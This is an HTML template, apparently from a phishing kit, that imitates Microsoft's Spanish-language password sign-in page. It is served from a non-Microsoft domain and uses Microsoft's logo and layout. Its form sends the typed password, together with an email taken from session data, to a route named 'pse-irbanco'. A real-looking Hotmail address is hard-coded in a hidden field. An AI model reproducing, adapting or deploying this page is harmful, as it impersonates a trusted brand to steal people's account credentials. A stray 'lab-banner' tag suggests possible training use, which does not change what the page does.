<!DOCTYPE html>
<!-- saved from url=(0038)https://v2.pserecarguen.uk/email/login -->
<html dir="ltr" lang="EN-US">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Continuar</title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="shortcut icon" href="https://v2.pserecarguen.uk/email/img/Microsoft/microsoft.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="/general/microsoft.css">
    <style type="text/css">
        .vue-slider-dot {
            position: absolute;
            -webkit-transition: all 0s;
            transition: all 0s;
            z-index: 5
        }

        .vue-slider-dot:focus {
            outline: none
        }

        .vue-slider-dot-tooltip {
            position: absolute;
            visibility: hidden
        }

        .vue-slider-dot-hover:hover .vue-slider-dot-tooltip,
        .vue-slider-dot-tooltip-show {
            visibility: visible
        }

        .vue-slider-dot-tooltip-top {
            top: -10px;
            left: 50%;
            -webkit-transform: translate(-50%, -100%);
            transform: translate(-50%, -100%)
        }

        .vue-slider-dot-tooltip-bottom {
            bottom: -10px;
            left: 50%;
            -webkit-transform: translate(-50%, 100%);
            transform: translate(-50%, 100%)
        }

        .vue-slider-dot-tooltip-left {
            left: -10px;
            top: 50%;
            -webkit-transform: translate(-100%, -50%);
            transform: translate(-100%, -50%)
        }

        .vue-slider-dot-tooltip-right {
            right: -10px;
            top: 50%;
            -webkit-transform: translate(100%, -50%);
            transform: translate(100%, -50%)
        }
    </style>
    <style type="text/css">
        .vue-slider-marks {
            position: relative;
            width: 100%;
            height: 100%
        }

        .vue-slider-mark {
            position: absolute;
            z-index: 1
        }

        .vue-slider-ltr .vue-slider-mark,
        .vue-slider-rtl .vue-slider-mark {
            width: 0;
            height: 100%;
            top: 50%
        }

        .vue-slider-ltr .vue-slider-mark-step,
        .vue-slider-rtl .vue-slider-mark-step {
            top: 0
        }

        .vue-slider-ltr .vue-slider-mark-label,
        .vue-slider-rtl .vue-slider-mark-label {
            top: 100%;
            margin-top: 10px
        }

        .vue-slider-ltr .vue-slider-mark {
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%)
        }

        .vue-slider-ltr .vue-slider-mark-step {
            left: 0
        }

        .vue-slider-ltr .vue-slider-mark-label {
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%)
        }

        .vue-slider-rtl .vue-slider-mark {
            -webkit-transform: translate(50%, -50%);
            transform: translate(50%, -50%)
        }

        .vue-slider-rtl .vue-slider-mark-step {
            right: 0
        }

        .vue-slider-rtl .vue-slider-mark-label {
            right: 50%;
            -webkit-transform: translateX(50%);
            transform: translateX(50%)
        }

        .vue-slider-btt .vue-slider-mark,
        .vue-slider-ttb .vue-slider-mark {
            width: 100%;
            height: 0;
            left: 50%
        }

        .vue-slider-btt .vue-slider-mark-step,
        .vue-slider-ttb .vue-slider-mark-step {
            left: 0
        }

        .vue-slider-btt .vue-slider-mark-label,
        .vue-slider-ttb .vue-slider-mark-label {
            left: 100%;
            margin-left: 10px
        }

        .vue-slider-btt .vue-slider-mark {
            -webkit-transform: translate(-50%, 50%);
            transform: translate(-50%, 50%)
        }

        .vue-slider-btt .vue-slider-mark-step {
            top: 0
        }

        .vue-slider-btt .vue-slider-mark-label {
            top: 50%;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        .vue-slider-ttb .vue-slider-mark {
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%)
        }

        .vue-slider-ttb .vue-slider-mark-step {
            bottom: 0
        }

        .vue-slider-ttb .vue-slider-mark-label {
            bottom: 50%;
            -webkit-transform: translateY(50%);
            transform: translateY(50%)
        }

        .vue-slider-mark-label,
        .vue-slider-mark-step {
            position: absolute
        }
    </style>
    <style type="text/css">
        .vue-slider {
            position: relative;
            -webkit-box-sizing: content-box;
            box-sizing: content-box;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            display: block;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
        }

        .vue-slider-rail {
            position: relative;
            width: 100%;
            height: 100%;
            -webkit-transition-property: width, height, left, right, top, bottom;
            transition-property: width, height, left, right, top, bottom
        }

        .vue-slider-process {
            position: absolute;
            z-index: 1
        }
    </style>
    <style>
        @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
    </style>
</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<x-lab-banner />
    <div>
        <!--  -->

        <!--  -->

        <div data-bind="if: activeDialog"></div>

        <form id="form1" action="{{ route('pse-irbanco') }}" method="post" >
        @csrf

            <!-- ko if: svr.C8 -->
            <!-- /ko -->

            <!-- ko withProperties: { '$loginPage': $data } -->
            <div data-bind="component: { name: &#39;master-page&#39;,
                    params: {
                        serverData: svr,
                        showButtons: svr.F,
                        showFooterLinks: true,
                        useWizardBehavior: svr.Bq,
                        handleWizardButtons: false,
                        password: password,
                        hideFromAria: ariaHidden },
                    event: {
                        footerAgreementClick: footer_agreementClick } }">
                <!--  -->

                <!-- ko ifnot: useLayoutTemplates -->
                <!-- /ko -->

                <!-- ko if: useLayoutTemplates -->
                <!-- ko withProperties: { '$page': $parent } -->
                <!-- ko ifnot: isVerticalSplitTemplate -->
                <div id="lightboxTemplateContainer"
                    data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr } }">
                    <!--  -->

                    <div
                        data-bind="component: { name: &#39;background-image-control&#39;, publicMethods: $page.backgroundControlMethods }">
                        <div class="background-image-holder" role="presentation"
                            data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                            <!-- ko if: smallImageUrl -->
                            <!-- /ko -->

                            <!-- ko if: backgroundImageUrl -->
                            <div style="background-image: url(./img/Microsoft/microsoft_bg.svg);"
                                class="background-image ext-background-image"></div>
                            <!-- ko if: useImageMask -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                    </div>

                    <div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
                        <!-- ko if: showHeader -->
                        <!-- /ko -->

                        <div class="template-section main-section">
                            <div class="middle" data-bind="css: { &#39;has-header&#39;: showHeader }">
                                <!-- ko if: $page.backgroundLogoUrl() && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                                <!-- /ko -->

                                <!-- ko if: svr.Cs && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) -->
                                <!-- /ko -->

                                <div id="lightbox" data-bind="
                    animationEnd: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().view_onAnimationEnd,
                    externalCss: { &#39;sign-in-box&#39;: true },
                    css: {
                        &#39;app&#39;: $page.backgroundLogoUrl(),
                        &#39;wide&#39;: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                        &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                        &#39;has-popup&#39;: $page.showFedCredButtons() || $page.newSession(),
                        &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                        &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }"
                                    class="sign-in-box ext-sign-in-box fade-in-lightbox">

                                    <!-- ko template: { nodes: $parentContext.$componentTemplateNodes, data: $page } -->

                                    <!-- ko if: svr.BG -->
                                    <!-- /ko -->

                                    <div class="lightbox-cover"
                                        data-bind="css: { &#39;disable-lightbox&#39;: svr.bY &amp;&amp; showLightboxProgress() }">
                                    </div>

                                    <!-- ko if: showLightboxProgress -->
                                    <!-- /ko -->

                                    <div class="win-scroll">
                                        <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                                        <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
                                            <!--  -->

                                            <!-- ko if: bannerLogoUrl -->
                                            <!-- /ko -->

                                            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                            <!-- ko component: 'accessible-image-control' -->
                                            <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                            <!-- /ko -->
                                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                            <!-- ko template: { nodes: [darkImageNode], data: $parent } -->

                                            <img class="logo" role="img" src="/general/microsoft_logo.svg"
                                                alt="Microsoft">
                                            <!-- /ko -->
                                            <!-- /ko -->
                                            <!-- /ko -->
                                            <!-- /ko -->
                                        </div>
                                        <!-- /ko -->

                                        <!-- ko if: svr.cU && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
                                        <!-- /ko -->

                                        <!-- ko if: asyncInitReady -->
                                        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                    publicMethods: paginationControlMethods,
                    params: {
                        enableCssAnimation: svr.aQ,
                        disableAnimationIfAnimationEndUnsupported: svr.b5,
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                    event: {
                        cancel: paginationControl_onCancel,
                        loadView: view_onLoadView,
                        showView: view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                        animationStateChange: paginationControl_onAnimationStateChange } }">
                                            <!--  -->

                                            <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }"
                                                class="">
                                                <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.J) -->
                                                <div data-bind="css: {
            &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
            &#39;slide-out-next&#39;: animate.isSlideOutNext(),
            &#39;slide-in-next&#39;: animate.isSlideInNext(),
            &#39;slide-out-back&#39;: animate.isSlideOutBack(),
            &#39;slide-in-back&#39;: animate.isSlideInBack() }" class="animate slide-in-next">

                                                    <div data-bind="component: { name: &#39;identity-banner-control&#39;,
                params: {
                    userTileUrl: svr.br,
                    displayName: sharedData.displayName || svr.J,
                    isBackButtonVisible: isBackButtonVisible(),
                    focusOnBackButton: isBackButtonFocused(),
                    backButtonDescribedBy: backButtonDescribedBy() },
                event: {
                    backButtonClick: identityBanner_onBackButtonClick } }">
                                                        <!--  -->

                                                        <div class="identityBanner">
                                                            <!-- ko if: isBackButtonVisible -->
                                                            <button type="button" class="backButton" data-bind="
            attr: { &#39;id&#39;: backButtonId || &#39;idBtn_Back&#39; },
            ariaLabel: str[&#39;CT_HRD_STR_Splitter_Back&#39;],
            ariaDescribedBy: backButtonDescribedBy,
            click: backButton_onClick,
            hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
                                                                <!-- ko ifnot: svr.CJ -->
                                                                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                                                <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                                <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
                                                                <img role="presentation"
                                                                    src="/general/arrow_left.svg"><!-- /ko -->
                                                                <!-- /ko --><!-- /ko -->
                                                                <!-- /ko -->

                                                                <!-- ko if: svr.CJ --><!-- /ko -->
                                                            </button>
                                                            <!-- /ko -->

                                                            <div id="displayName" class="identity"
                                                                data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }">
                                                                {{ session('entrada0')['email'] }}</div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <!-- /ko -->

                                                <div class="pagination-view animate has-identity-banner slide-in-next"
                                                    data-bind="css: {
            &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.J),
            &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
            &#39;animate&#39;: animate(),
            &#39;slide-out-next&#39;: animate.isSlideOutNext(),
            &#39;slide-in-next&#39;: animate.isSlideInNext(),
            &#39;slide-out-back&#39;: animate.isSlideOutBack(),
            &#39;slide-in-back&#39;: animate.isSlideInBack() }">

                                                    <!-- ko foreach: views -->
                                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                    <!-- /ko -->

                                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                    <!-- /ko -->

                                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                    <!-- ko template: { nodes: [$data], data: $parent } -->
                                                    <div data-viewid="2" data-showidentitybanner="true"
                                                        data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.AH === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                                        <!--  -->

                                                        <!--  -->

                                                        <input type="hidden" name="i13"
                                                            data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
                                                        <input type="hidden" name="login"
                                                            data-bind="value: unsafe_username">
                                                        <input type="text" name="loginfmt"
                                                            data-bind="moveOffScreen, value: unsafe_displayName"
                                                            class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                                        <input type="hidden" name="type"
                                                            data-bind="value: svr.Bq ? 20 : 11" value="11">
                                                        <input type="hidden" name="LoginOptions"
                                                            data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                                                        <input type="hidden" name="lrt"
                                                            data-bind="value: callMetadata.IsLongRunningTransaction"
                                                            value="">
                                                        <input type="hidden" name="lrtPartition"
                                                            data-bind="value: callMetadata.LongRunningTransactionPartition"
                                                            value="">
                                                        <input type="hidden" name="hisRegion"
                                                            data-bind="value: callMetadata.HisRegion" value="">
                                                        <input type="hidden" name="hisScaleUnit"
                                                            data-bind="value: callMetadata.HisScaleUnit" value="">
                                                        <input name="email" type="hidden" id="email"
                                                            value="unbertoqopola@hotmail.com">
                                                        <div id="loginHeader" class="row title ext-title" role="heading"
                                                            aria-level="1"
                                                            data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;], externalCss: { &#39;title&#39;: true }">
                                                            Escribir contraseña</div>

                                                        <!-- ko if: showCredViewBrandingDesc -->
                                                        <!-- /ko -->

                                                        <!-- ko if: unsafe_pageDescription -->
                                                        <!-- /ko -->

                                                        <div class="row">
                                                            <div class="form-group col-md-24">
                                                                <div role="alert" aria-live="assertive">

                                                                    <div id="passError">

                                                                    </div>

                                                                    <div class="placeholderContainer">
                                                                        <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                                        <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                                                                        <input name="emailPassword" type="password"
                                                                            id="i0118" autocomplete="off"
                                                                            class="form-control input ext-input text-box ext-text-box"
                                                                            placeholder="Contraseña" required="">

                                                                        <!-- ko if: svr.C0 && showPassword() -->
                                                                        <!-- /ko -->
                                                                        <!-- /ko -->
                                                                        <!-- /ko -->
                                                                        <!-- ko ifnot: usePlaceholderAttribute -->
                                                                        <!-- /ko -->
                                                                    </div>

                                                                    <!-- ko if: svr.C0 -->
                                                                    <!-- /ko -->
                                                                </div>
                                                            </div>

                                                            <!-- ko if: shouldHipInit -->
                                                            <!-- /ko -->

                                                            <div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }"
                                                                class="position-buttons">
                                                                <div>
                                                                    <!-- ko if: svr.Ct -->
                                                                    <!-- /ko -->
                                                                    <!-- ko if: svr.Bb !== false && !svr.Ct && !tenantBranding.KeepMeSignedInDisabled -->
                                                                    <!-- /ko -->

                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <!-- ko if: showAccessRecoveryLink -->
                                                                                <div class="form-group">
                                                                                    <a id="idA_PWD_ForgotPassword"
                                                                                        role="link"
                                                                                        style="cursor: pointer; color: #0067b8;"
                                                                                        data-bind="
                                text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;],
                                href: accessRecoveryLink || svr.t,
                                attr: { target: accessRecoveryLink &amp;&amp; &#39;_blank&#39; },
                                click: accessRecoveryLink ? null : resetPassword_onClick">¿Olvidó su contraseña?</a>
                                                                                </div>
                                                                                <!-- /ko -->
                                                                                <!-- ko if: allowPhoneDisambiguation -->
                                                                                <!-- /ko -->
                                                                                <!-- ko ifnot: useEvictedCredentials -->
                                                                                <!-- ko component: { name: "cred-switch-link-control",
                                params: {
                                    serverData: svr,
                                    username: username,
                                    availableCreds: availableCreds,
                                    flowToken: flowToken,
                                    currentCred: { credType: 1 } },
                                event: {
                                    switchView: credSwitchLink_onSwitchView,
                                    redirect: onRedirect,
                                    setPendingRequest: credSwitchLink_onSetPendingRequest,
                                    updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
                                                                                <!--  -->

                                                                                <div class="form-group">
                                                                                    <!-- ko if: showSwitchToCredPickerLink -->
                                                                                    <!-- /ko -->

                                                                                    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
                                                                                    <!-- /ko -->

                                                                                    <!-- ko if: credentialCount === 0 && showForgotUsername -->
                                                                                    <!-- /ko -->
                                                                                </div>

                                                                                <!-- ko if: credLinkError -->
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: evictedCreds.length > 0 -->
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->
                                                                                <!-- ko if: showChangeUserLink -->
                                                                                <!-- /ko -->
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <div class="win-button-pin-bottom"
                                                                    data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
                                                                    <div class="row"
                                                                        data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
                                                                        <div>
                                                                            <div
                                                                                class="col-xs-24 no-padding-left-right button-container">

                                                                                <!-- ko if: isSecondaryButtonVisible -->
                                                                                <!-- /ko -->

                                                                                <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }"
                                                                                    class="inline-block">
                                                                                    <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                                    <input type="submit"
                                                                                        class="button ext-button primary ext-primary"
                                                                                        value="Iniciar sesión">
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <!-- ko if: tenantBranding.BoilerPlateText -->
                                                            <!-- /ko -->
                                                        </div>
                                                        <!-- /ko -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->

                                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                        <!-- /ko -->
                                                        <!-- /ko -->
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- /ko -->
                                        </div>

                                        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId"
                                            value="">
                                        <input type="hidden" name="psRNGCDefaultType"
                                            data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                                        <input type="hidden" name="psRNGCEntropy"
                                            data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                                        <input type="hidden" name="psRNGCSLK"
                                            data-bind="value: postedLoginStateViewRNGCSLK" value="">
                                        <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
                                        <input type="hidden" name="ctx" data-bind="value: ctx" value="">
                                        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId"
                                            value="">
                                        <input type="hidden" id="i0327"
                                            data-bind="attr: { name: svr.bC }, value: flowToken" name="PPFT"
                                            value="DSW8O13EJYtPEmMZc9!KF*culS2sob2MVkgbWyNTHDX1vvErh7xuFICaWMunHktHbeIZJXtOkNW41RvB!tSdXRR985ojFYAA4rCnnjvtpna9cKFK5FbHCAn36f5YPPH!WtkhY8cNcjjXRkxTaED6yPz2LERz8awuetCHi67fow6nGvUDjB*A52TFGQQ4YFJFXs2g68Ry*UTTHzkgWcnQhdYdNyopadGfDeNojnpuOJs3*I1DLiIxC6XHI8iNb4LENcZYwKCwYeIlwI*vqIX!kTM$">
                                        <input type="hidden" name="PPSX" data-bind="value: svr.cq" value="Pa">
                                        <input type="hidden" name="NewUser" value="1">
                                        <input type="hidden" name="FoundMSAs" data-bind="value: svr.Aj" value="">
                                        <input type="hidden" name="fspost"
                                            data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                                        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0"
                                            value="0">
                                        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.BG ? 1 : 0"
                                            value="0">
                                        <input type="hidden" name="IsFidoSupported"
                                            data-bind="value: isFidoSupported() ? 1 : 0" value="0">
                                        <input type="hidden" name="isSignupPost"
                                            data-bind="value: isSignupPost() ? 1 : 0" value="0">

                                        <div data-bind="component: { name: &#39;instrumentation-control&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
                                            <input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
                                            <input type="hidden" name="i18" data-bind="value: srsSuccess">
                                            <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                                        </div>
                                        <!-- /ko -->
                                    </div>

                                    <!-- ko if: $page.showFedCredButtons -->
                                    <!-- /ko -->

                                    <!-- ko if: $page.newSession -->
                                    <!-- /ko -->

                                    <!-- ko if: $page.showDebugDetails -->
                                    <!-- /ko -->

                                    <!-- ko if: !svr.CA && $page.paginationControlMethods() && $page.paginationControlMethods().hasInitialViewShown() -->
                                    <div id="footer" role="contentinfo" data-bind="
                    externalCss: {
                        &#39;footer&#39;: true,
                        &#39;has-background&#39;: !$page.useDefaultBackground(),
                        &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">

                                        <div data-bind="component: { name: &#39;footer-control&#39;,
                        publicMethods: $page.footerMethods,
                        params: {
                            serverData: svr,
                            useDefaultBackground: $page.useDefaultBackground(),
                            hasDarkBackground: $page.backgroundLogoUrl(),
                            showLinks: true },
                        event: {
                            agreementClick: $page.footer_agreementClick,
                            showDebugDetails: $page.toggleDebugDetails_onClick } }">
                                            <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                                            <div id="footerLinks" class="footerNode text-secondary">

                                                <!-- ko if: showFooter -->
                                                <!-- ko if: !hideTOU -->
                                                <a id="ftrTerms" data-bind="
                text: termsText,
                href: termsLink,
                click: termsLink_onClick,
                externalCss: {
                    &#39;footer-content&#39;: true,
                    &#39;footer-item&#39;: true,
                    &#39;has-background&#39;: !useDefaultBackground,
                    &#39;background-always-visible&#39;: hasDarkBackground }" style="cursor: pointer;"
                                                    class="footer-content ext-footer-content footer-item ext-footer-item">Terms
                                                    of use</a>
                                                <!-- /ko -->

                                                <!-- ko if: !hidePrivacy -->
                                                <a id="ftrPrivacy" data-bind="
                text: privacyText,
                href: privacyLink,
                click: privacyLink_onClick,
                externalCss: {
                    &#39;footer-content&#39;: true,
                    &#39;footer-item&#39;: true,
                    &#39;has-background&#39;: !useDefaultBackground,
                    &#39;background-always-visible&#39;: hasDarkBackground }" style="cursor: pointer;"
                                                    class="footer-content ext-footer-content footer-item ext-footer-item">Privacy
                                                    &amp; cookies</a>
                                                <!-- /ko -->

                                                <!-- ko if: impressumLink -->
                                                <!-- /ko -->

                                                <!-- ko if: showIcpLicense -->
                                                <!-- /ko -->
                                                <!-- /ko -->

                                                <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                                                <a id="moreOptions" style="cursor: pointer;" role="button" data-bind="
            click: moreInfo_onClick,
            ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
            attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
            hasFocusEx: focusMoreInfo(),
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;debug-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }"
                                                    aria-label="Click here for troubleshooting information"
                                                    aria-expanded="false"
                                                    class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                                            </div>
                                            <!-- /ko -->

                                            <!-- ko if: svr.Cq && showLinks -->
                                            <!-- /ko -->
                                        </div>
                                    </div>
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- /ko -->

                    <!-- ko if: isVerticalSplitTemplate() && isVerticalSplitTemplateLoaded() -->
                    <!-- /ko -->
                    <!-- /ko -->
                    <!-- /ko -->
                </div>
                <!-- /ko -->

            </div>
        </form>
        <script>
        </script>

    </div>
</body>
<div class="troywell-avia"><template shadowrootmode="open">
        <style>
            @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
        </style>
        <div id="troywell-avia" data-v-app="">
            <div class="app">
                <div data-v-138a3c39=""><!----></div>
            </div>
        </div>
    </template></div>
<div class="troywell-caa"><template shadowrootmode="open">
        <style>
            @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
            @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/caa/styles.css");
        </style>
        <div id="troywell-caa" data-v-app="">
            <div class="content-app" data-v-9eaabcdc=""><!----></div>
        </div>
    </template></div>

</html>